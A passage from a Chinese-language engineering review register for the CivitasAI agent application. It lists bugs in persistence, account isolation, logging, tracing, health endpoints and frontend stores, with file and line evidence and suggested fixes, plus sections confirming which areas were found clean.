| REV-186 | 服务 | 中 | 业务 | 写库结果从不验证：全仓无一处检查 `result.changes`；`upsertAgent/Task/Subtask` 返回 void → 属主不匹配或行不存在时 UPDATE 静默 0 行仍算成功，内存态被当权威。修复：回传 changes，0 行记 warn。△子代理（主审认可其代码位抽查） |
| REV-187 | 服务 | 中 | 交互 | `Src/Infra/Db/transaction.ts:20-50` 导出的 `transaction/eventsTransaction/memoryTransaction` **全仓零调用**（只有 checkpointStore/todoStore/memoryEntryStore 各自直接用 `db.transaction`）→ 事务原语是死代码，多表写入一律裸奔：`taskRepository.ts:71-103` sessions `INSERT OR IGNORE`+tasks `INSERT` 非原子（第二条失败留 `run-<traceId>` 孤儿会话行，且 sessions 无 owner 使跨账号同名**静默复用他人会话行**）；`chatApi.ts:287,302` 写消息与刷新 `updated_at` 非原子；`iterationCheckpoint.ts:53-87` ensureLoopRow/createCheckpoint/touchLoop 三步非原子且 `:53` 忽略返回值 → 恢复从旧轮重跑（重复副作用）。✅复核(死代码)/△(具体链) |
| REV-188 | 服务 | 中 | 安全 | 重启/切号期的属主真空：`recoveryScanner.ts:70-73` 与 `effectJournal.ts:228-232` 均无 owner 条件，而此刻 `activeOwner` 必为 `local`（setActiveOwner 只在 PUT 一处）→ 启动扫描全局把他人账号的 EXECUTING 副作用改判 UNKNOWN 并据此裁决。同族 REV-030。△子代理 |
| REV-189 | 服务 | 中 | 业务 | 版本化写盘缺属主与并发覆盖：`globalWorkspace.ts:178-187` 把旧条目改 `superseded` **只动内存从不持久化** → DB 里旧行永远 `status='active'`，重启后 `read()`(:220) 合并出同 key 多活；`getLatestByKey`(:254) 只查内存 keyIndex 且无 owner 过滤 → 切号后版本基线归零、乐观锁失效；`entryCounter`(:26) 未按新属主恢复（对照 `:391-394`）→ 新 `ws-N` 撞他人 entry_id，被 `ON CONFLICT(entry_id) DO UPDATE`（不含 owner）**静默改写他人行**（同 REV-018 agentId 家族）。△子代理 |
| REV-190 | 服务 | 低 | 日志/交互 | 库连接收尾不齐：`database.ts:134,143,147` 把配置值直接字符串插值进 PRAGMA（`synchronous` 写错即整库 FATAL 且无校验提示）；全仓无慢查询/语句耗时留痕，迁移只 log 条数不记是哪几条；`closeDatabase` 仅挂 SIGINT（`main.ts:907`），桌面形态走 `stopServer`(:885) **从不关库**、`⑦.5 purgeExpired` 也不执行，且关闭异常被 `catch {}` 吞。△子代理 |

### 12.3 其余持久化面（REV-191~202）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-191 | 服务 | 高 | 日志/业务 | 治理与审批证据链可"丢证据仍放行"：`approvalPersistence.ts:142-148` create 落库失败只 warn，随后 decide 的 `UPDATE … WHERE approval_id`(:156-163) 不检查 `result.changes` → 库里 0 行、人类放行/拒绝的**证据永久缺失**而工具照常执行；`governanceAudit.ts:107-129` 同型（留痕失败不阻断治理动作）。修复：证据写库失败即拒绝执行（fail-closed）。△子代理 |
| REV-192 | 服务+桌面 | 中 | 交互 | 双实例并发写：`database.ts:56-71` 无单库独占 + `electron/` 无 `requestSingleInstanceLock`（见 REV-158）→ 两进程共享 `%APPDATA%` 库与各自的内存队列/计数器，叠加 `INSERT OR REPLACE`（`aiEventStore.ts:96`、`governanceAudit.ts:111`、`approvalPersistence.ts:104`）互相覆盖行。修复：实例锁 + 改 `ON CONFLICT DO NOTHING`。△子代理 |
| REV-193 | 服务 | 中 | 交互 | `aiEventStore.ts:55,78,81,105` 的 `seqCounter` 进程级从 0 重启，回放按 `ORDER BY ts, seq`(:125) 定序 → 同毫秒事件跨重启乱序（思考/工具卡重建错序）；`lastKnownSessionId` 兜底会把无会话字段的事件挂到**上一个会话/上一个账号**。修复：seq 取 `MAX(seq)+1` 起算、禁止跨会话兜底。△子代理 |
| REV-194 | 服务 | 中 | 业务 | 守恒口径自身不自洽：`walletManager.ts:215-235` `confiscate()` 扣 balance 但既不回冲 systemPool 也不加 destroyedTotal（对照 `debit:112`）→ 罚没后 `verifyConservation` 恒报负 delta；`destroyedTotal` 全仓无自增点；`verifyLedgerConservation`(`tokenLedger.ts:56-57`) 对 destroyedTotal 在 actual 加、expected 减 → delta 双倍误报，且该函数**无生产调用者**（同 REV-1xx"实现了但没接线"家族）。△子代理 |
| REV-195 | 服务 | 中 | 切号一致性 | `memoryApi.ts:224-232` 切活动属主后只 `hydrateLongTermMemory()`：globalWorkspace / agents / 治理台账 / toolResultCache / 审批队列既不清理也不回灌 → 上一个账号的内存态继续为下一个账号服务（与 REV-181/182 互为放大）。修复：切号统一 reset + hydrate 清单化。△子代理 |
| REV-196 | 服务 | 中 | 日志 | 铁律违例成片（无注释无日志的 `catch { return 0/[]/null }`）：`effectJournal.ts:306-308`、`idempotencyStore.ts:135-137`、`a2aStore.ts:96,107,489`、`aiEventStore.ts:147-149`、`longTermMemoryStore.ts:69,211,224`、`memoryEntryStore.ts:32,109`、`memoryEmbeddings.ts:64,107,209`。其中 `getPendingCount()→0` 会**直接掩盖 DUR-006 的满盘告警**；embedding 读失败当"无向量"使语义检索静默退化。△子代理 |
| REV-197 | 服务 | 低 | 交互 | `fsSafe.ts:97` `writeFileSync` 非原子 → `workspaceManager.ts:134,159-165` 的 meta.json 半 JSON 即永久不可解析；Result 被丢弃不日志；归档读失败时 `if (readResult.ok)` 跳过写入却 `return ok` = 静默假成功。△子代理 |
| REV-198 | 服务 | 低 | 业务/安全 | `governanceAudit.ts:270-274` 的 `getGovernanceRecord` 只查内存（` :204` 2000 条淘汰后按 ID 查不到，而 DB 有行）→ 审计详情时而可见时而 404；`list/hydrate` 每次全表 SELECT 无 LIMIT；`serverIdentity.ts:36,102,131` 的 `resetServerIdentityCache()` **零调用方** → 登出后 60s 内旧令牌仍判可信（信任驻留）。△子代理 |
| REV-199 | 服务 | 低 | 业务 | `agentRegistry.ts:193,216` 软删除两标记从不一起写：`unregisterAgent` 只写 `destroyed_at` 不改 `status` → 库里已销毁 Agent 状态仍是 running/ready，审计视图 `loadAgents(true)` 显示"活着"，与面板/统计口径冲突；agents 表亦无 `updated_at`，状态迁移无法计时。△子代理 |
| REV-200 | 服务 | 低 | 交互 | `checkpointStore.ts:54-70` 给单条 INSERT 包 `db.transaction` 属**伪事务**（注释写"DB 事务写入"易误导读者），且与 loops 父行写入不在同一事务。修复：去掉或扩大到 loop+checkpoint 原子写。✅复核 |
| REV-201 | 服务 | 低 | 日志 | `migrations.ts` 全程无 logger（成功/失败/应用了哪几条都不落盘，仅 main.ts 打一条 info 条数）→ 用户环境里"schema 到底到没到 v29"无法事后取证。✅复核 |
| REV-202 | 前端 | 待补 | — | M09 前端 store 持久化视角尚未回传，补入本节。 |

### 12.4 已核对为干净的点（M09）

- 五个仓库 SQL 全参数化；`SET ${sets.join(', ')}` 片段皆硬编码 `列 = ?`，无用户输入进 SQL；`a2aStore.ts:155-164,498` 的 WHERE 片段与表名来自白名单。
- Db 层无全表 `DELETE`：仅 `migrations.ts:835` 按 version 删账本行；仓库层销毁一律软删（destroyed_at / archived_at）。
- 连接生命周期正确：`database.ts:57` 幂等复用单例、`:130` 自动建目录、WAL + busy_timeout + foreign_keys=ON（`:141-144`）齐备，全仓仅 `:134` 一处 `new Database`。
- 迁移版本号冲突自检有效（`migrations.ts:766-777`，按 `database:version` 判重），当前 37 条无重号；`_migrations` 三库各自建立（`:785-787`）；`Services/AccountScope/activeAccount.ts` 只是纯 re-export 薄壳，无第二份属主状态。
- 原子写与 fail-closed 的正面样板存在于别处：`atomicWrite.ts`（tmp+fsync+rename）、`atomicAppend:154-167`（读失败即中止不覆盖）、`userConfigWriter.ts:161-177`（解析失败拒写）、`configLoader` 经 pathResolver 取目录且 `default.json` 缺失即 FATAL（无 cwd 依赖）、`pathGuard` 已接入 atomic/fsSafe 全部写路径 —— 修复 REV-184/197 时可直接复用这些实现。
- `chatApi.addMessage:284` 优先取会话自身 owner、`toolResultCache.ts:60` 缓存键含属主前缀，属已正确隔离的两处。

---

### 12.5 前端 Store 持久化与三端契约（REV-202~213）

> 核心事实（主审核对）：**全仓零 `zustand/middleware` persist**，持久化只由四处手写 localStorage 承担（prefs / config.overrides / hotReload.pending / hotReload.restart）；其余 store 一律内存态靠 REST/事件回放重建。

| store | 持久化 | 位置 | key 含账号 | rehydrate |
|---|---|---|---|---|
| chatStore | 否 | 后端库 + `ai_events` 回放 | 后端 owner | 挂载 hydrate |
| accountStore | 部分 | serverUrl→localStorage；tokens/deviceId/deviceCredential→secureStore（浏览器=sessionStorage） | ❌ | `init()` |
| prefsStore | 是 | `civitas.prefs` / `civitas.sync.meta` | 仅 meta | **`hydrate()` 零调用** |
| configStore / hotReloadStore | 是 | `civitas.config.overrides.v1` / `...pending.v1` / `...restart.v1` | ❌ | 模块加载同步 |
| approval/event/todo/governance/loop | 否 | 内存 | — | 事件 + 30s 轮询 |
| model/onboarding | 否 | 密钥在后端 secretsStore | — | 面板挂载 |

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-202 | 前端 | 高 | 持久化 | `prefsStore.ts:110-116` 的 `hydrate()` **全仓零调用**（主审 grep `usePrefsStore.getState().hydrate` 命中 0），`accountStore.ts:376-401` 的 `init()` 恢复登录态后也不 pull（只有 `login()` 才拉，`:449`）→ 每次重启 prefs 恒为 DEFAULT、`selectedModel=''` → Composer 发空 model。修复：boot 阶段调 hydrate + init 内自动 pull。✅复核 |
| REV-203 | 前端+远端 | 高 | 业务/丢数据 | REV-202 的空 prefs 会被 `syncService.ts:400-417` 的 pushAll 整体 PUT 上行 → 云端 `data.app` 被 `selectedModel:''` 覆盖，换机时把真实偏好洗掉（`settings.ts:35-62`）。修复：push 前 diff 空值、或强制先 pull。△子代理 |
| REV-204 | 前端 | 中 | 账号隔离 | `accountStore.ts:299-313` `adoptAccount` 只清 chat/approval/prefs；`configStore.ts:86` 的 overrides 与 `hotReloadStore.ts:97-98` 的队列按机器共享、切号不清 → B 继承 A 的配置覆盖并上行进 B 的云端（同 REV-129 家族，新数据集）。△子代理 |
| REV-205 | 前端 | 中 | 业务 | 脏标记不落盘：`prefsStore.ts:107,120`、`configStore.ts:54,160` 的 `dirty` 只存内存，且全仓无自动 push（仅 AccountPanel 手动）→ 刷新后"有未同步改动"提示归零，改动可能永不上云且用户以为已同步。△子代理 |
| REV-206 | 前端 | 中 | 可用性 | `hotReloadStore.ts:35-47,97-98` 的 `load*` 无 `Array.isArray` 守卫，且在 `create()` 里**同步求值** → localStorage 值一旦被写坏，模块导入期抛错、整应用白屏（`chatStore.ts:473` 的注释自陈踩过同类）。修复：解析失败回落默认 + 类型守卫。△子代理 |
| REV-207 | 前端 | 中 | 业务 | 回放静默截断：`eventStore.ts:31-32` 缓冲 >1000 即裁到 500，而 `chatStore.ts:344-346` 的回放推入上限 2000、后端 `chatApi.ts:540` 另有 limit → 重启后早期思考/工具块丢失且无"已截断"提示。修复：回放与实时流分桶 + 丢弃计数。△子代理 |
| REV-208 | 前端 | 中 | 契约 | `AgentView.tsx:115-126` 用 `event_id` 做去重键，但历史接口带该字段、实时 `RawBusMessage` **不带** → 去重永不生效（同事件双份）；`liveEvents` 只按 agentId 过滤不按 sessionId → 其他会话事件混入。注：REV-022 曾判"无消费方故未暴露"，现已失效。△子代理 |
| REV-209 | 前端+服务 | 中 | 契约 | `chatStore.ts:25` 的前端 `WorkingMode` 有 7 个成员（含 `AUDIT`），后端 `Decision/types.ts:12-18` 只有 6 种，且 `ipcBridge.ts:933` 的 `_workingMode` 带下划线从不被读、`chat_sessions`（`migrations.ts:273-279`）无 `working_mode` 列 → 用户选的工作方式发出即丢、恒回退 DIRECT。这是 REV-010 的量化补证（枚举成员级偏差）。△子代理 |
| REV-210 | 前端+桌面 | 中 | 安全/凭据 | `accountStore.ts:173-192`：`deviceCredential` 也走 `secureStore`，而浏览器/降级形态是 sessionStorage（`secureStore.ts:58-84`）→ **每个标签页生成新设备身份**，FE-033 的严格设备模式重蹈"指纹漂移"；另 `store.set` 的返回值在 `:206-210` 全部被丢弃 → 写盘失败仍显示已登录，刷新即掉线且无提示。△子代理 |
| REV-211 | 服务 | 低 | 属主 | `chatApi.ts:333,380` 的 update/upsertRichMessage 用全局 `getActiveOwner()`，而 `:282-284` 的 addMessage 特取会话自身属主 → 同一功能两套口径；切账号后富结构消息找不到原行、另插一条（同 REV-001/REV-181 家族）。△子代理 |
| REV-212 | 前端 | 低 | 体验 | `TaskList.tsx:49,138,144` 的 loading 取自 taskStore 而非 chatStore → 会话仍在拉取时先闪"暂无任务"；`agentStore.ts:26-33`、`taskStore.ts:29-35` 的 hydrate 失败不置 error、静默保留旧值（同 REV-012/007 家族）。△子代理 |
| REV-213 | 前端 | 低 | 日志 | 四处 localStorage 写盘的 catch 全吞（`prefsStore.ts:69-75`、`configStore.ts:40`、`hotReloadStore.ts:50,54`）→ 配额满/隐私模式下用户以为已保存；`civitas.prefs`、`civitas.sync.meta` 无版本后缀、无 migrate（同 REV-012 家族）。△子代理 |

**REV-021 裁定材料补全**（不另计条目）：除已登记的三套会话模型外，前端还有**第四套** `Conversation/AgentCard`（`chatStore.ts:30-32,46-63,482-496`，由 session 1:1 派生，代码内自陈 TODO），后端与远端 `Server/` 均无对应实体；远端另用第三套命名 `user_tasks.client_session_id`（`Server/src/repositories/tasks.ts:13-20`）。裁定时须一并纳入。

### 12.6 已核对为干净的点（M09 前端）

- 无异步 rehydrate 竞态：四处 localStorage 读取都在模块加载期同步完成，App 以 `ready` 门控渲染（`App.tsx:37-53`）。
- 令牌不进 zustand 状态树、不进 localStorage（`accountStore.ts:132-134`）；前端无密钥打印、无密钥序列化上行（`a2aSync.ts:71-101` 有脱敏，其缺口见 REV-170）。
- 运行态正确地不持久化：streamBuffers / `streamingMessageId` / eventStore / uiStore；供应商密钥由后端 `ipcBridge.ts:484 restoreProvidersFromSecrets` 自恢复（`modelStore.ts:137` 的前端同名函数为零调用死码）。
- `prefsStore.adoptAccount` 的水位隔离与 `todoStore` 的事件/回放同构通路自洽。

---

## 13. Bug 登记表（M10 可观测性：日志 / 追踪 / 健康）

### 13.1 后端日志与追踪（REV-214~228）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-214 | 服务 | 致命 | 日志/业务 | `runIteration.ts:649` 非流式模型调用失败时 `return { content: \`ERROR: ${result.error}\` }`，**把错误文本当模型正文**返回 → `:653` 赋给 `outputText`、`:987` 写入对话历史 → 错误串污染后续 prompt、可能直出给用户，且整条路径零 logger（实测 `Logs/` 内 `Model call failed` 0 次）。修复：返回 err 并短路 + `logger.error`。✅复核 |
| REV-215 | 服务 | 致命 | 日志 | **LLM Infra 层零日志**：`Src/Infra/Llm/` 下 openaiProvider/providerBase/retryPolicy/index/providerProbe/providerSecretMatch 的 `grep -c "logger\."` **全为 0**；流式失败仅 `return ok({...exitReason:'risk'})`（`runIteration.ts:625-631`）→ 实测 `Logs/` 里 `exitReason:"risk"` 出现 **52 次而原因零记录**。同 REV-013 家族但位置全新。修复：provider 层失败/重试/降级一律留痕。✅复核 |
| REV-216 | 服务+桌面 | 高 | 日志 | 优雅关闭不覆盖桌面形态（主审复核）：`main.ts:1006` `if (!process.versions.electron)` 才调 `main()`，而 `shutdownLogger()`（`:960,:992`）与 `_Meta`/trace-index 写入都只在 `main()`/SIGINT 路径内；`stopServer()`（`:885-888`）只停 HTTP+IPC、不 flush → **Electron 每次关窗丢尾部缓冲日志、`Logs/_Meta` 永不生成**（与 REV-017 同源但后果不同）。修复：flush 收口进 `stopServer()` 并接 `before-quit`。✅复核 |
| REV-217 | 服务 | 高 | 日志 | 追踪机制是死码：`traceContext.ts:81,108,133` 的 `runInTrace`/`runInSpan`/`runWithOperation` 在 `Src/`+`electron/` **零调用**（主审 grep 除定义文件外 0 命中）→ ALS 从未生效；实测 `Logs/business.log` 4052 行仅 8 行含 traceId（0.2%），`system.log` 0 行。修复：HTTP/IPC 入口与 loop 执行处包 runInTrace。✅复核 |
| REV-218 | 服务 | 高 | 日志 | 四套互不兼容的 traceId 生成式：`traceContext`(UUID) / `agentExecutor.ts:67` `trace-exec-<base36>` / `ipcBridge.ts:1021` `trace-<ms>-<hex4>` / `arbitrationApi.ts:48` `trace-arb-<ms>`，且无 `traceparent`/`X-Trace-Id` 跨层透传 → 日志与 `ai_events.trace_id`、DB 的 trace_id 无法互查，TraceReplay 断链。△子代理 |
| REV-219 | 服务 | 高 | 日志 | 限流拒绝零留痕：`apiRateLimiter.ts:96` 写 429 时该文件无任何 logger 调用（主审核对该文件 import 亦无 logger）；`Core/Middleware/builtin/rateLimiter.ts` 同为 0 → 无法判断谁被限流、阈值是否配错（叠加 REV-014 的前端洪泛即"看不见"）。✅复核 |
| REV-220 | 服务 | 高 | 安全 | 后端日志**没有脱敏层**：`logger.ts:230-236` + `logWriter.ts:179` 只做浅层 key 过滤即 `JSON.stringify` 落盘；对照组云端 `Server/src/logger.ts:23-52` 有 `redact()`、`Server/src/app.ts:79-89` 有 pino redact paths。项目本身持有供应商明文 Key（secretsStore）→ 任何一次 `logger.info(..., { apiKey })` 即明文落盘并随"日志包"外带。当前实测未泄漏（见干净点），属**缺护栏**。△子代理 |
| REV-221 | 服务 | 高 | 日志 | `logWriter.ts:179` 的 `JSON.stringify(line)` 无 try/catch，`logger.ts:200` 调用处也不包 → 循环引用 / BigInt 会让 `logger.error()` **自身抛异常**，在错误处理路径上二次崩溃，且违背该文件自述"写失败静默丢弃不阻断主流程"。修复：包 try 并降级为 `{message, stringifyError}`。✅复核 |
| REV-222 | 服务 | 中 | 业务 | 双轨分流形同虚设：`logger.ts:219-225` `routeTrack(level, _data)` 的 `_data` 未用，只按 level 分流（error/fatal→system，其余全 business）→ 实测 `business.log` 里 `source:"main"` 占 2443/4052（**60% 是启动/配置/DB 等系统日志**），而业务失败（`runIteration.ts:900`）落进 system.log。修复：按 source 白名单分流。✅复核 |
| REV-223 | 服务 | 中 | 日志 | `loopEngine.ts:78-80` `failLoop(state, _reason)` 的 `_reason` 直接丢弃（函数体只改 phase）；`runIteration.ts:1041-1049` "主循环结束"只记 `exitReason` 不记 `exitMessage` → 52 次 risk 退出无任何诊断文本可查（与 REV-215 合流）。✅复核 |
| REV-224 | 服务 | 中 | 日志 | `openaiProvider.ts:296` 流式 SSE 分片解析 `catch { /* 跳过解析失败的行 */ }` 静默吞 → 增量 `tool_calls.arguments` 可整段丢失、工具调用凭空消失无痕迹（同 REV-0xx"跳过注释满足门禁却仍吞错"家族）。修复：至少 warn 一次并带行序号。△子代理 |
| REV-225 | 远端服务 | 中 | 业务 | `/readyz` 就绪判定不含 schema：`Server/src/index.ts:28-33` 显示 `runMigrations` 只在 `scripts/migrate.ts`/测试里调，启动仅 `db.ping()` → 未建表的库仍回 `{status:'ready', db:'up'}`（`app.ts:149-156`）。修复：readyz 加迁移版本校验。△子代理 |
| REV-226 | 三端 | 中 | 交互/体验 | 本地后端**根本没有 health 路由**：`/healthz`、`/readyz` 只存在于 `Server/`（云端 8787），`Src/` 后端 3000 未实现；前端 `accountStore.ts:415,418` 却对任意 serverUrl 调它们 → 若误指向本地后端，请求落到 SPA fallback（`httpServer.ts:88`）返回 **HTTP 200 + index.html**，直到 `serverApi.ts:197` JSON.parse 才报错，用户看到"服务端返回非 JSON（HTTP 200）"这种不可理解的提示并被判定"连接失败"。另本地错误体 `{ok:false,error:"字符串"}` 与契约 `{error:{code,message}}` 不符，前端退化为 `UNKNOWN`（同族 REV-011）。修复：Src 补 health 路由或前端锁形态。✅复核 |
| REV-227 | 服务 | 低 | 日志 | 产物无上限与崩溃无兜底：`traceIndex.ts:70` 每次优雅关闭写一个新 `trace-index-<ts>.json`、全仓无清理（对比 logWriter 有 10MB×5 轮转）；`Src/`+`electron/` 无 `uncaughtException`/`unhandledRejection`/`exit` 兜底 flush（主审 grep 零命中，同 REV-132/158），崩溃即丢缓冲；未 init 时 `logger.ts:199-210` 降级 `console.*`，而 Windows GUI 子系统下 Electron 的 console **无宿主** = 等同丢弃。✅复核 |
| REV-228 | 桌面 | 中 | 日志 | 主/渲染进程侧完全无落盘：`electron/main.ts` 全文诊断（`console-message` `:263-283`、`did-fail-load`、`render-process-gone`、`:338-353`）一律 `console.*`，electron/ 下 `writeFileSync` 只用于探针与 secure-store；无 `--enable-logging`/`logPath`；`crashReporter` 全仓 0 引用（仅 `FamilyErrorBoundary.tsx:47` 一句 TODO）→ `ErrorBoundary.tsx:8` 承诺"转发进日志"落空，"渲染错误→主进程→后端日志"链条第一环即断。△子代理 |

### 13.2 桌面桥接与取证链（REV-229~239）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-229 | 桌面 | 高 | 日志 | `initLogger` 返回 false 后**不回落 console**：`logger.ts:199` 只看 writer 是否存在，而 `logWriter.ts:177` 的 `write()` 首行 `if (!this.dirWritable) return;` 直接静默丢弃、`:308` 的 `writeMeta` 也被短路 → 只读/受限目录下降级为"既无文件也无告警"，Runbook 里"查 `_Meta/config.json` 的 writeFailed"随之失效。修复：不可写时 console + dialog，并把状态位经 `ipc-get-app-paths` 暴露。△子代理 |
| REV-230 | 桌面 | 高 | 交互 | IPC 边界丢 traceId：`ipcBridge.ts:182-186` 的 `IpcMessage` 只有 `type/data/timestamp`，`:264-268` 广播时把 `event.traceId`/`eventId` 丢弃 → 渲染层拿不到也回传不了 traceId，用户报障无法与后端日志对齐（承 REV-217/218）。△子代理 |
| REV-231 | 桌面 | 中高 | 交互 | `ipcBridge.ts:1021,1026` 自造 `trace-${Date.now()}-${hex4}` 只塞进 `createLoopState`、不包 ALS，且 `:1012,1051,1059` 的 `createEvent` 不传 traceId → 库里 traceId 与日志对不上（REV-218 的桌面侧证据）。△子代理 |
| REV-232 | 桌面 | 高 | 体验 | 无"诊断"通道：`ipcBridge.ts` 全部频道（39 个）与 `preload.ts` 均无 log/health/diagnose/systemInfo/trace 类接口 → 用户侧无法"一键导出诊断"，只能靠人工翻 `%APPDATA%\CivitasAI\Logs`（与 REV-226 的本地无 health 合流）。△子代理 |
| REV-233 | 桌面 | 高 | 业务/安全 | 数据根回落 `%TEMP%` 且无人告知：`electron/main.ts:138,160,186` + `pathResolver.ts:458-471` 末级回落 `tmpdir()/CivitasAI`，原因写进 `CIVITAS_USER_DATA_REASON` 后**全仓 0 消费者**、`:162` 只 console.warn；于是日志/库/密钥整体落到会被系统清理的临时目录（数据可被抹掉），而 `describePaths` 与启动失败弹窗（`:359-369`）都不显示这一事实。△子代理 |
| REV-234 | 桌面 | 中 | 日志 | 假证据型诊断：`electron/main.ts:307` 的 ui-debug 探针读取 `window.__CIVITAS_UI_ERRORS__`，全仓**无生产者** → `errors: []` 恒成立，探针给出"前端未报错"的错误结论。△子代理 |
| REV-235 | 桌面 | 中 | 日志 | `ipcBridge.ts:763-765,770-775`（新位置，同 REV-012/013 家族）：catch 后返回 `{ok:true,data:{items:[]}}`，`:770-775` 对常量包 try/catch 恒返回空 → 面板"空但显示正常"。△子代理 |
| REV-236 | 桌面 | 高 | 日志 | 崩溃零留痕：全仓（`Src/`+`electron/`）无 `uncaughtException`/`unhandledRejection`（主审 grep 零命中）、`crashReporter` 0 引用 → 后端跑在主进程内，任一未捕获异常直接杀掉桌面应用且磁盘无痕（承 REV-132/158/227，修复应在主进程最早处注册两级 handler 并同步 append `Logs/crash.log`）。✅复核 |
| REV-237 | 服务 | 中 | 日志 | REST 5xx 无痕（= REV-143 的取证侧补证）：`webServer.ts:21,90,95` 的 `getRequestLogs/getRequestCount` 生产侧零消费者，只有 `Tests/Interface/interactionObservability.spec.ts` 用 → 该内存环既是死数据又无任何落盘。✅复核（同族，勿重复立项） |
| REV-238 | 桌面 | 高 | 交互 | 打包形态可取证内容几乎为零的**综合结论**（非独立缺陷，供修复优先级参考）：主/渲染无落盘（REV-228）+ 目录不可写静默（REV-229）+ 关闭不 flush/不写 `_Meta`（REV-216）+ traceId 四处不一致且 IPC 边界丢失（REV-218/230/231）→ 用户报障时基本无法远程定位。日志目录本身**可定位**（`%APPDATA%\CivitasAI\Logs`，除 REV-233 的 %TEMP% 情形）。✅复核 |
| REV-239 | 前端 | 中 | 日志/体验 | `ErrorBoundary.tsx:69,73-85,112`：仅 `console.error`、无上报、诊断文本不含 traceId/会话 id，恢复动作是整窗 reload（全量丢失）；已有局部重试的 `FamilyErrorBoundary.tsx:53` 却未被使用（见 REV-252）。△子代理 |

### 13.3 前端消费侧（REV-240~250）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-240 | 前端 | 高 | 业务 | Dashboard 桑基图**编造数据**：`TokenFlowSankey.tsx:70,81-84,90-93` 无交易时用 `systemPool * 0.1 //假设10%流转` 造总量，即便有交易、缺某类型仍回退 `?? totalFlow*0.6/0.2/0.15/0.05` → 把固定百分比当真实资金分布展示。修复：无数据即"暂无"，禁止比例兜底。△子代理 |
| REV-241 | 前端 | 高 | 交互 | `ChatView.tsx:56` 忽略 `sendMessage` 返回值：`chatStore.ts:680-689` 失败时回滚气泡并 `return null`，调用方仍无条件 `beginStream + send` → 用户消息消失 + 空转圈、无报错（同 REV-007 家族，新调用点）。△子代理 |
| REV-242 | 前端 | 中 | 日志 | `rateLimited` 状态是死数据：`api.ts:161` 置位、`systemStore.ts:36-45` 维护，但全仓**无组件消费**（grep 确认）→ 限流对用户不可见，自动重试仍失败则彻底静默（与 REV-167 的"永久卡 true"叠加后连状态都不可读）。△子代理 |
| REV-243 | 前端 | 中 | 体验 | "LIVE" 说谎：`useDashboardData.ts:23-25` + `Dashboard.tsx:34-40` + `systemStore.ts:47-52` —— 仅 systemStore 每 5s 轮询，agents/tasks/token 不轮询；hydrate 失败静默、`lastUpdated` 停在旧值，脉冲动画与"更新于 X"照旧 → 拉取失败仍伪装实时。△子代理 |
| REV-244 | 前端 | 中 | 日志 | "空数据"与"加载失败"不可区分成片：`loopStore.ts:34`、`taskStore.ts:33`、`agentStore.ts:31`、`tokenStore.ts:43` 均为 `else set({loading:false})` 无 error；`TraceReplay.tsx:107/160` 两种情形都显示"暂无 Trace 数据"，选中后 `traceEvents` 为空则**永久卡"加载中…"**（同 REV-007/012 家族）。△子代理 |
| REV-245 | 前端 | 中 | 业务 | 告警规则半实现半宣传：`useAlerts.ts:92-97` 规则 1"Token 异常"是 TODO 空壳从不触发，但页脚（`AlertList.tsx:79`）仍宣传 5 条规则；`:26` 的 `INITIAL_SUPPLY=10000` 硬编码决定"系统池不足"的 CRITICAL 阈值，与后端真实总量漂移即误报。△子代理 |
| REV-246 | 前端 | 中低 | 业务 | "N 项待生效"是空头支票：`configStore.ts:213-224` 的 `applyEffective` 只回写 localStorage（注释"未来可通知后端"），`ipcApi.ts:189` 只有 get 无 set，`SystemConfig.tsx:203-216` 却显示待生效徽章且无失败反馈。同 REV-010"UI 有控件、后端不消费"家族。△子代理 |
| REV-247 | 前端 | 低 | 日志 | `eventStore.ts:41-45` 缓冲超 1000 静默 `slice(-500)`、无丢弃计数；`AIEventBus.tsx:58-63` 切会话 `clearEvents` 清的是**全局共享**缓冲，多实例互扰（与 REV-207 同族）。△子代理 |
| REV-248 | 前端 | 低 | 交互 | `approvalStore.ts:114-131` unanimous 多角色循环中途失败只置 `lastError`，前几步决策已落库、无回滚也无"部分已批"提示 → 用户重复点击语义混乱（承 REV-023 家族的 decidedBy 前缀条目）。△子代理 |
| REV-249 | 前端 | 低 | 业务 | `TraceReplay.tsx:3,168-209` 标题写"Span 树"，实现是按时间平铺的列表、无 spanId 父子嵌套 → 与业界树状语义不符，误导排障（粒度本身存在：`+delta` `:198`、时间戳 `:200`）。△子代理 |
| REV-250 | 前端 | 中 | 日志/体验 | 在线状态说谎的完整闭环（**合并登记**，避免与 REV-168 重复）：`eventBusBridge.ts:41-58` 恒置在线 + 无心跳 + `OfflineBanner.tsx:10` 永不出现；`systemStore.ts:34` 亦然。修复项应与 REV-168 一并立项（加 healthz 心跳/IPC 断连回调）。✅复核 |

### 13.4 已核对为干净的点（M10）

- **`/healthz` 与 `/readyz` 真实存在且语义可信**（就 `Server/` 云端而言）：`Server/src/app.ts:148-156` 实现、`PUBLIC_EXACT` 白名单免鉴权免限流（`:59`）；`uptimeSec` 来自真实 `process.uptime()`；`readyz.db` 来自 `db.ping()` 的实际 `SELECT 1`（`Server/src/db/pool.ts:89-96`）**非硬编码 "ok"**，失败走 `unavailable()`→503。缺口只在本地 `Src/` 后端未实现（REV-226）与不含迁移状态（REV-225）。
- 落盘有界与轮转正确：`logWriter.ts` `appendFileSync` 显式 utf-8（`:269`）、10MB×(1+5)×2 轨 ≈120MB 上限、`rotateFile`(:283-302) 逆序 rename 最旧覆盖、`flush`(:204-206) 先摘缓冲区再落盘避免重入丢行；`createLogWriter` 全仓仅 `logger.ts:91` 一处；`.write_test.tmp` 探针与历史残留有清理（`:138-149`，实测 `Logs/` 无残留）。
- **当前日志无凭据泄漏**（实测取证）：`Logs/business.log`、`Logs/system.log` 中 `apiKey` / `sk-` / `password` / `token` 的值命中均为 0，密钥类只出现 env 变量名；`toolDispatcher.ts:99-106` 只记 toolName/agentId 不记 arguments；`main.ts:492-494` 只记 provider 名与 envVar 名；`secretsStore.ts:154` 只记 count。风险在"缺强制脱敏护栏"（REV-220）。
- 级别过滤、`initLogger` 幂等、`setLogLevel` 热重载正确；`Logs/` 与 `*.log` 已在 `.gitignore:15,63`；dev 态 `resolve('Logs/')` 的 cwd 依赖已在 `main.ts:186-190` 对安装/便携态改用 `getLogDir()` 规避。
